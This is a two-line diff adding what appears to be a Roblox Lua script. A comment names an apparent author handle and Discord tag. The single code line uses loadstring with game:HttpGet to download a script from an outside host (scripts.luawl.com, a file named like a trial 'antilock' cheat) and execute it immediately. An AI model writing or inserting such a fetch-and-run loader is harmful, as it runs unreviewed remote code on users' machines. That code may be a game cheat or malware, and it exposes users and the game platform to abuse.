@@ -1,0 +1,2 @@
+-- creamedantidose / crupvolbot#0124
+loadstring(game:HttpGet('https://scripts.luawl.com/hosted/2416/20507/eodantilockTrial.lua'))()
